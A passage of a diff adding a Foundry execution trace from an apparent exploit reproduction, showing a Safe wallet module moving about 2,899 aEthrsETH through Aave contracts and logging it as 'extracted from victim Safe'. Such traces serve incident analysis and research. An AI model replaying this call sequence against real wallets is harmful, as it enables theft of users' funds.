+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [155915] 0x000000000022D473030F116dDEE9F6B43aC78BA3::transferFrom(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 0x000000000004444c5dc75cB358380D2e3dE08A90, 2899999999999997756820 [2.899e21], 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [154523] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::transferFrom(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 0x000000000004444c5dc75cB358380D2e3dE08A90, 2899999999999997756820 [2.899e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [153905] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::transferFrom(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 0x000000000004444c5dc75cB358380D2e3dE08A90, 2899999999999997756820 [2.899e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7701] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 339009775819474312010473 [3.39e23], 53402647379773014367746 [5.34e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 339009775819474312010473 [3.39e23], 53402647379773014367746 [5.34e22]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1201] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(0x000000000004444c5dc75cB358380D2e3dE08A90, 339009775819474312010473 [3.39e23], 635415539851865 [6.354e14])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(0x000000000004444c5dc75cB358380D2e3dE08A90, 339009775819474312010473 [3.39e23], 635415539851865 [6.354e14]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, amount: 9509165293 [9.509e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Mint(param0: 0x000000000022D473030F116dDEE9F6B43aC78BA3, param1: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, param2: 9509165293 [9.509e9], param3: 9509165293 [9.509e9], param4: 1000000145645003414925581297 [1e27])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, to: 0x000000000004444c5dc75cB358380D2e3dE08A90, amount: 2899999999999997756820 [2.899e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit BalanceTransfer(param0: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, param1: 0x000000000004444c5dc75cB358380D2e3dE08A90, param2: 2899999577629549369682 [2.899e21], param3: 1000000145645003414925581297 [1e27])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [113375] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::finalizeTransfer(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7, 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 0x000000000004444c5dc75cB358380D2e3dE08A90, 2899999577629549369682 [2.899e21], 53402647379773014367746 [5.34e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [112837] 0x728a138A4823392C2EFA55e028d434F526fE03CF::finalizeTransfer(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7, 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, 0x000000000004444c5dc75cB358380D2e3dE08A90, 2899999577629549369682 [2.899e21], 53402647379773014367746 [5.34e22]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2402] 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e::getPriceOracle() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000054586be62e3c3580375ae3723c145253060ca0c2
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [99031] SupplyLogic::8a5dadd1(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000370000000000000000000000000000000000000000000000000000000000000035000000000000000000000000a1290d69c65a6fe4df752f95823fae25cb99e5a700000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba8000000000000000000000000000000000004444c5dc75cb358380d2e3de08a9000000000000000000000000000000000000000000000009d35942aff70239952000000000000000000000000000000000000000000000b4ef69bd48d2f735e0200000000000000000000000054586be62e3c3580375ae3723c145253060ca0c20000000000000000000000000000000000000000000000000000000000000003) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [20919] AaveOracle::getAssetPrice(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15397] 0x5424384B256154046E9667dDFaaa5e550145215e::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7901] 0x7c7FdFCa295a787ded12Bb5c1A49A8D2cC20E3F8::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003a303cbcb0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003a303cbcb0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 249917390000 [2.499e11]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7685] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::scaledBalanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2665] 0xb27C52c7f84819e3157993489741cB60786aE330::scaledBalanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000009e740809cd090e9cf8a
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000009e740809cd090e9cf8a
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24732] AaveOracle::getAssetPrice(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [19210] 0x7292C95A5f6A501a9c4B34f6393e221F2A0139c3::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9442] 0x349A73444b1a310BAe67ef67973022020d70020d::rsETHPrice() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2350] 0xC59110239240761cCd3E670288443316e10Dd271::rsETHPrice() [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000efd6bdeed2368f4
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000efd6bdeed2368f4
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2897] 0x5424384B256154046E9667dDFaaa5e550145215e::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1901] 0x7c7FdFCa295a787ded12Bb5c1A49A8D2cC20E3F8::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003a303cbcb0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003a303cbcb0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003ed9fe46d7
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 269945292503 [2.699e11]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1274] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::scaledBalanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [665] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::scaledBalanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000ab1c107a98dbf4fc4b0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000ab1c107a98dbf4fc4b0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x2bbea0206622d98c29eed16b53791ff35e58eae7622e136a8703af29e40a6363: 0x00000000000000000000000000000000000000000000009d3595ab2438adc594 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x581d7182eb791c6eebca52946532541d11855e9488e9da7f93c647ae45d2a0c0: 0x00000000033b2e44850add3be293b9560000000000000b4ef69bd48d2f735e02 → 0x00000000033b2e44850b7f2ef9319bf10000000000000ab1c107a98dbf4fc4b0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa99c5ab5007ffa12d2fdebd2ed12aca993a28c83994a5b1325b98cb853cf62c6: 0x00000000033b2e44850b7f2ef9319bf10000000000000000000241e83589a259 → 0x00000000033b2e44850b7f2ef9319bf1000000000000009d35966ce7a5ad3bab
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x449b0108364ff9496dde7137d67502e9c4e6f8ea48aec6bceb6c51be7481bc78: 0x00000000000000006aa8cbcb00000000000000000000009d3595ab2438adc594 → 0x00000000000000006aa8cbcb0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5768] 0x000000000004444c5dc75cB358380D2e3dE08A90::settle()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3794] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::balanceOf(0x000000000004444c5dc75cB358380D2e3dE08A90) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3185] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::balanceOf(0x000000000004444c5dc75cB358380D2e3dE08A90) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2900000635415630153783 [2.9e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2900000635415630153783 [2.9e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000009d3595ab2438adc594
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [859] 0x000000000004444c5dc75cB358380D2e3dE08A90::exttload(0xac78a1f439b6b2163a59677f99472c0475241d3b215caff16273b80cee73a42f) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd0288c057f6342556eabc4f2f4df4cf58ed1f833b5d8b8be254fd3b8fd3cd715: 0 → 0x6f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f00001400000a00
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xc249ee5acf0d101fcdf36c2becbf4712b160fd8378aad791db5122f9dacfba31: 0 → 0x00000000000000000000000040e93a52f6af9fcd3b476aedadd7feabd9f7aba8
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 404329 → 404330
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x2303a4645faf1f96378286e8c91ab63f823705b2f066cfa9306a9db04581c9f4: 1 → 2
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─ [6657] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModuleReturnData(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba30000000000000000000000000000000000000000000000000000000000000000, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [6275] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModuleReturnData(0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba30000000000000000000000000000000000000000000000000000000000000000, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3269] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2657] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, spender: 0x000000000022D473030F116dDEE9F6B43aC78BA3, amount: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─ [5684] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::execTransactionFromModuleReturnData(0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba30000000000000000000000000000000000000000000000000000000000000000, 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ [5302] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::execTransactionFromModuleReturnData(0x8762788ba3ecEe7B61Fc7578A3533433E20461F5, 0, 0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba30000000000000000000000000000000000000000000000000000000000000000, 0) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [2296] 0x8762788ba3ecEe7B61Fc7578A3533433E20461F5::approve(0x000000000022D473030F116dDEE9F6B43aC78BA3, 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8, spender: 0x000000000022D473030F116dDEE9F6B43aC78BA3, amount: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x906650aff8420cd88e2418a08c39e0f733bea5adeda54e508549b2bbb5728ce0: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xd675d55222cb64b0a42ed1c6c497724331f9d302006924054e3a6ede8fd5f59c: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x32a9d22287aa291b825be045fecc409ec42a5d8a18d79cc8a876f954854ed8f4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x47a81c0a59f5262b8dd7b477bdf78318db865fa7a936fcfb2f1e4902e51cd285: 0 → 404329
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   ├─ emit ExecutionFromModuleSuccess(param0: 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca)
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000002e00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000002e00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000002e00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Return]
+    │   └─ ← [Stop]
+    ├─ [3794] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [staticcall]
+    │   ├─ [3185] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [delegatecall]
+    │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   └─ ← [Return] 50502655157601776604032 [5.05e22]
+    │   └─ ← [Return] 50502655157601776604032 [5.05e22]
+    ├─ emit log_named_decimal_uint(key: "aEthrsETH extracted from victim Safe", val: 2899999999999997756821 [2.899e21], decimals: 18)
+    ├─ [3794] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [staticcall]
+    │   ├─ [3185] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [delegatecall]
